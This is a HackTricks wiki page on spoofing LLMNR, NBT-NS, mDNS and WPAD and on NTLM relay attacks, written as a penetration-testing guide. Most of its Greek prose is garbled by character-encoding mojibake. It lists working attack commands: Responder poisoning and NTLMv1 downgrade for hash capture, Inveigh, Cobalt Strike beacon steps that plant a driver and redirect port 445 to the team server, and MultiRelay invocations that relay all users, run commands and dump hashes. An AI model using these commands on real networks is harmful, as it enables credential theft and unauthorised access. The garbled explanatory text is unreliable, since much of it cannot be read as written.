# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Network Protocols

### Local Host Resolution Protocols
- **LLMNR, NBT-NS, and mDNS**:
- Î— Microsoft ÎºÎ±Î¹ Î¬Î»Î»Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ LLMNR ÎºÎ±Î¹ NBT-NS Î³Î¹Î± Ï„Î¿Ï€Î¹ÎºÎ® Î±Î½Î¬Î»Ï…ÏƒÎ· Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½ ÏŒÏ„Î±Î½ Î±Ï€Î¿Ï„Ï…Î³Ï‡Î¬Î½ÎµÎ¹ Ï„Î¿ DNS. ÎŸÎ¼Î¿Î¯Ï‰Ï‚, Ï„Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Ï„Î·Ï‚ Apple ÎºÎ±Î¹ Ï„Î¿Ï… Linux Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ mDNS.
- Î‘Ï…Ï„Î¬ Ï„Î± Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î± ÏƒÎµ Ï€Î±ÏÎµÎ¼Î²Î¿Î»Î­Ï‚ ÎºÎ±Î¹ spoofing Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Î¼Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·Ï‚, ÏÎ±Î´Î¹Î¿Ï†Ï‰Î½Î¹ÎºÎ®Ï‚ Ï†ÏÏƒÎ·Ï‚ Ï„Î¿Ï…Ï‚ Î¼Î­ÏƒÏ‰ UDP.
- [Responder](https://github.com/lgandx/Responder) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€Î¿Î¹Î·Î¸ÎµÎ¯ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ ÏˆÎµÏ…Î´ÎµÎ¯Ï‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ ÏƒÎµ hosts Ï€Î¿Ï… ÎµÏÏ‰Ï„Î¿ÏÎ½ Î±Ï…Ï„Î¬ Ï„Î± Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î±.
- Î ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÏ€Î¿Î¯Î·ÏƒÎ· Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Responder Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ [ÎµÎ´Ï](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)
- Î¤Î¿ WPAD ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î­Ï‚ Î½Î± Î±Î½Î±ÎºÎ±Î»ÏÏ€Ï„Î¿Ï…Î½ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ proxy.
- Î— Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ· Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½ÎµÏ„Î±Î¹ Î¼Î­ÏƒÏ‰ DHCP, DNS Î® ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ¬ ÏƒÎµ LLMNR ÎºÎ±Î¹ NBT-NS Î±Î½ Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹ Ï„Î¿ DNS.
- Î¤Î¿ Responder Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ WPAD, ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î¿Ï…Ï‚ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ ÏƒÎµ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï…Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ WPAD.

### Responder for Protocol Poisoning
- **Responder** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Î´Î·Î»Î·Ï„Î·ÏÎ¯Î±ÏƒÎ· ÎµÏÏ‰Ï„Î·Î¼Î¬Ï„Ï‰Î½ LLMNR, NBT-NS ÎºÎ±Î¹ mDNS, Î±Ï€Î±Î½Ï„ÏÎ½Ï„Î±Ï‚ ÎµÏ€Î¹Î»ÎµÎºÏ„Î¹ÎºÎ¬ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¿Ï…Ï‚ Ï„ÏÏ€Î¿Ï…Ï‚ ÎµÏÏ‰Ï„Î·Î¼Î¬Ï„Ï‰Î½, ÎºÏ…ÏÎ¯Ï‰Ï‚ ÏƒÏ„Î¿Ï‡ÎµÏÎ¿Î½Ï„Î±Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ SMB.
- ÎˆÏÏ‡ÎµÏ„Î±Î¹ Ï€ÏÎ¿ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ ÏƒÏ„Î¿ Kali Linux, ÏÏ…Î¸Î¼Î¹Î¶ÏŒÎ¼ÎµÎ½Î¿ ÏƒÏ„Î¿ `/etc/responder/Responder.conf`.
- Î¤Î¿ Responder ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÎ¹ Ï„Î¹Ï‚ ÏƒÏ…Î»Î»Î·Ï†Î¸ÎµÎ¯ÏƒÎµÏ‚ ÎºÎ±Ï„Î±ÎºÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ ÏƒÏ„Î·Î½ Î¿Î¸ÏŒÎ½Î· ÎºÎ±Î¹ Ï„Î¹Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ `/usr/share/responder/logs`.
- Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„ÏŒÏƒÎ¿ IPv4 ÏŒÏƒÎ¿ ÎºÎ±Î¹ IPv6.
- Î— Î­ÎºÎ´Î¿ÏƒÎ· Windows Ï„Î¿Ï… Responder ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· [ÎµÎ´Ï](https://github.com/lgandx/Responder-Windows).

#### Running Responder
- Î“Î¹Î± Î½Î± Ï„ÏÎ­Î¾ÎµÏ„Îµ Ï„Î¿ Responder Î¼Îµ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚: `responder -I <Interface>`
- Î“Î¹Î± Ï€Î¹Î¿ ÎµÏ€Î¹Î¸ÎµÏ„Î¹ÎºÎ® Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· (Î¼Îµ Ï€Î¹Î¸Î±Î½Î­Ï‚ Ï€Î±ÏÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚): `responder -I <Interface> -P -r -v`
- Î¤ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î³Î¹Î± Î½Î± ÏƒÏ…Î»Î»Î¬Î²ÎµÏ„Îµ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÎ¹Ï‚/Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ NTLMv1 Î³Î¹Î± ÎµÏ…ÎºÎ¿Î»ÏŒÏ„ÎµÏÎ· Î´Î¹Î¬ÏƒÏ€Î±ÏƒÎ·: `responder -I <Interface> --lm --disable-ess`
- Î— Ï€ÏÎ¿ÏƒÏ€Î¿Î¯Î·ÏƒÎ· WPAD Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Îµ: `responder -I <Interface> --wpad`
- Î¤Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± NetBIOS Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÏ€Î¹Î»Ï…Î¸Î¿ÏÎ½ ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…, ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î­Î½Î±Ï‚ proxy Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚: `responder.py -I <interface> -Pv`

### DHCP Poisoning with Responder
- Î— Ï€ÏÎ¿ÏƒÏ€Î¿Î¯Î·ÏƒÎ· Ï„Ï‰Î½ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÏ‰Î½ DHCP Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î»Î·Ï„Î·ÏÎ¹Î¬ÏƒÎµÎ¹ Î¼ÏŒÎ½Î¹Î¼Î± Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î´ÏÎ¿Î¼Î¿Î»ÏŒÎ³Î·ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ Î¸ÏÎ¼Î±Ï„Î¿Ï‚, Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Î½Ï„Î±Ï‚ Î¼Î¹Î± Ï€Î¹Î¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ® ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® Î»ÏÏƒÎ· Î±Ï€ÏŒ Ï„Î·Î½ Î´Î·Î»Î·Ï„Î·ÏÎ¯Î±ÏƒÎ· ARP.
- Î‘Ï€Î±Î¹Ï„ÎµÎ¯ Î±ÎºÏÎ¹Î²Î® Î³Î½ÏÏƒÎ· Ï„Î·Ï‚ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ Ï„Î¿Ï… Î´Î¹ÎºÏ„ÏÎ¿Ï… ÏƒÏ„ÏŒÏ‡Î¿Ï….
- Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚: `./Responder.py -I eth0 -Pdv`
- Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î»Î»Î¬Î²ÎµÎ¹ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬ Ï„Î¹Ï‚ ÎºÎ±Ï„Î±ÎºÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ NTLMv1/2, Î±Î»Î»Î¬ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ® Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÎµÏ…Ï‡Î¸ÎµÎ¯ Î· Î´Î¹Î±ÎºÎ¿Ï€Î® Ï„Î¿Ï… Î´Î¹ÎºÏ„ÏÎ¿Ï….

### Capturing Credentials with Responder
- Î¤Î¿ Responder Î¸Î± Ï€ÏÎ¿ÏƒÏ€Î¿Î¹Î·Î¸ÎµÎ¯ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î± Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î±, ÏƒÏ…Î»Î»Î±Î¼Î²Î¬Î½Î¿Î½Ï„Î±Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± (ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ NTLMv2 Challenge/Response) ÏŒÏ„Î±Î½ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏƒÎµ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚.
- ÎœÏ€Î¿ÏÎ¿ÏÎ½ Î½Î± Î³Î¯Î½Î¿Ï…Î½ Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹ÎµÏ‚ Ï…Ï€Î¿Î²Î¬Î¸Î¼Î¹ÏƒÎ·Ï‚ ÏƒÎµ NetNTLMv1 Î® Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ESS Î³Î¹Î± ÎµÏ…ÎºÎ¿Î»ÏŒÏ„ÎµÏÎ· Î´Î¹Î¬ÏƒÏ€Î±ÏƒÎ· Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½.

Î•Î¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ Î· Ï‡ÏÎ®ÏƒÎ· Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Ï„ÎµÏ‡Î½Î¹ÎºÏÎ½ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î¯Î½ÎµÏ„Î±Î¹ Î½Î¿Î¼Î¯Î¼Ï‰Ï‚ ÎºÎ±Î¹ Î·Î¸Î¹ÎºÎ¬, ÎµÎ¾Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· ÎºÎ±Î¹ Î±Ï€Î¿Ï†ÎµÏÎ³Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Î¹Î±ÎºÎ¿Ï€Î® Î® Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·.

## Inveigh

Î¤Î¿ Inveigh ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± Ï„Î¿Ï…Ï‚ Î´Î¿ÎºÎ¹Î¼Î±ÏƒÏ„Î­Ï‚ Î´Î¹ÎµÎ¯ÏƒÎ´Ï…ÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï„Î¹Ï‚ Î¿Î¼Î¬Î´ÎµÏ‚ ÎºÏŒÎºÎºÎ¹Î½Ï‰Î½, ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÎ¼Î­Î½Î¿ Î³Î¹Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Windows. Î ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Ï€Î±ÏÏŒÎ¼Î¿Î¹ÎµÏ‚ Î¼Îµ Ï„Î¿ Responder, ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ spoofing ÎºÎ±Î¹ man-in-the-middle. Î¤Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î­Ï‡ÎµÎ¹ ÎµÎ¾ÎµÎ»Î¹Ï‡Î¸ÎµÎ¯ Î±Ï€ÏŒ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ PowerShell ÏƒÎµ Î­Î½Î± Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ C#, Î¼Îµ [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) ÎºÎ±Î¹ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) Ï‰Ï‚ Ï„Î¹Ï‚ ÎºÏÏÎ¹ÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚. Î›ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ ÎºÎ±Î¹ Î¿Î´Î·Î³Î¯ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿ [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Î¤Î¿ Inveigh Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Î­ÏƒÏ‰ PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Î‰ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Ï‰Ï‚ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Î‘Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î¹Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯ÎµÏ‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ SMB Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Î¹Î± ÏƒÏ„Î¿Ï‡Î¿Î¸ÎµÏ„Î·Î¼Î­Î½Î· Î¼Î·Ï‡Î±Î½Î®, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î­Î½Î± ÏƒÏÏƒÏ„Î·Î¼Î± shell Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚. ÎŸÎ¹ Î²Î±ÏƒÎ¹ÎºÎ­Ï‚ Ï€ÏÎ¿Ï‹Ï€Î¿Î¸Î­ÏƒÎµÎ¹Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½:
- ÎŸ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î¿ÏÎ¼ÎµÎ½Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Local Admin ÏƒÏ„Î¿Î½ Î±Î½Î±Î¼ÎµÏ„Î±Î´Î¹Î´ÏŒÎ¼ÎµÎ½Î¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®.
- Î— Ï…Ï€Î¿Î³ÏÎ±Ï†Î® SMB Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·.

#### 445 Port Forwarding and Tunneling

Î£Îµ ÏƒÎµÎ½Î¬ÏÎ¹Î± ÏŒÏ€Î¿Ï… Î· Î¬Î¼ÎµÏƒÎ· Î´Î¹ÎºÏ„Ï…Î±ÎºÎ® ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÏ†Î¹ÎºÏ„Î®, Î· ÎºÎ¯Î½Î·ÏƒÎ· ÏƒÏ„Î·Î½ Ï€ÏŒÏÏ„Î± 445 Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÏÎ¿Ï‰Î¸Î·Î¸ÎµÎ¯ ÎºÎ±Î¹ Î½Î± Ï„Î¿ÏÎ½ÎµÎ». Î•ÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ [**PortBender**](https://github.com/praetorian-inc/PortBender) Î²Î¿Î·Î¸Î¿ÏÎ½ ÏƒÏ„Î·Î½ Î±Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ ÎºÎ¯Î½Î·ÏƒÎ·Ï‚ Ï„Î·Ï‚ Ï€ÏŒÏÏ„Î±Ï‚ 445 ÏƒÎµ Î¬Î»Î»Î· Ï€ÏŒÏÏ„Î±, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ ÏŒÏ„Î±Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· local admin Î³Î¹Î± Ï„Î· Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Î¿Î´Î·Î³ÏÎ½.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Î†Î»Î»Î± Î•ÏÎ³Î±Î»ÎµÎ¯Î± Î³Î¹Î± Î•Ï€Î¯Î¸ÎµÏƒÎ· NTLM Relay

- **Metasploit**: Î¡Ï…Î¸Î¼Î¯ÏƒÏ„Îµ Î¼Îµ proxies, Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ Ï„Î¿Ï€Î¹ÎºÏÎ½ ÎºÎ±Î¹ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Ï‰Î½ hosts.
- **smbrelayx**: ÎˆÎ½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Python Î³Î¹Î± Ï„Î·Î½ Î±Î½Î±Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ· SMB ÏƒÏ…Î½ÎµÎ´ÏÎ¹ÏÎ½ ÎºÎ±Î¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½ Î® Ï„Î·Î½ Î±Î½Î¬Ï€Ï„Ï…Î¾Î· backdoors.
- **MultiRelay**: ÎˆÎ½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î±Ï€ÏŒ Ï„Î· ÏƒÎ¿Ï…Î¯Ï„Î± Responder Î³Î¹Î± Ï„Î·Î½ Î±Î½Î±Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ· ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î® ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½, Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½ Î® Ï„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® hashes.

ÎšÎ¬Î¸Îµ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î¼Î­ÏƒÏ‰ SOCKS proxy Î±Î½ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î¼Îµ Î­Î¼Î¼ÎµÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿.

### Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± MultiRelay

Î¤Î¿ MultiRelay ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ _**/usr/share/responder/tools**_ Ï†Î¬ÎºÎµÎ»Î¿, ÏƒÏ„Î¿Ï‡ÎµÏÎ¿Î½Ï„Î±Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ IP Î® Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
